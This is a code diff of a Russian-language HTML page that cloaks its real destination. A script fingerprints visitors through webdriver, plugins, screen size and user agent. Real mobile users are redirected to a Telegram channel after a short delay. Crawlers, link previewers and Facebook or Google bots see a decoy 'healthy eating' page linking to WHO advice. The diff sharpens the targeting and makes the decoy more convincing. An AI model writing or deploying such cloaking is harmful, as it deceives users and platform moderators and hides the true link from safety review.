@@ -1,21 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
+  <meta charset="UTF-8">
   <title>Загрузка...</title>
   <script>
     const isRealUser = () => {
       return !navigator.webdriver &&
              navigator.plugins.length > 0 &&
              screen.width > 320 &&
-             !/bot|facebook|crawler|preview/i.test(navigator.userAgent);
+             /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent) &&
+             !/bot|facebook|crawler|preview|google/i.test(navigator.userAgent);
     };
 
     if (isRealUser()) {
-      setTimeout(function() {
+      setTimeout(function () {
         window.location.replace("https://t.me/paradise_opt");
-      }, 100);
+      }, 300);
     } else {
-      document.write("https://www.who.int/ru/news-room/fact-sheets/detail/healthy-diet");
+      document.write(`
+        <h1>Здоровое питание</h1>
+        <p>Официальные рекомендации по питанию от ВОЗ:</p>
+        <a href="https://www.who.int/ru/news-room/fact-sheets/detail/healthy-diet" target="_blank">
+          https://www.who.int/ru/news-room/fact-sheets/detail/healthy-diet
+        </a>
+      `);
     }
   </script>
 </head>
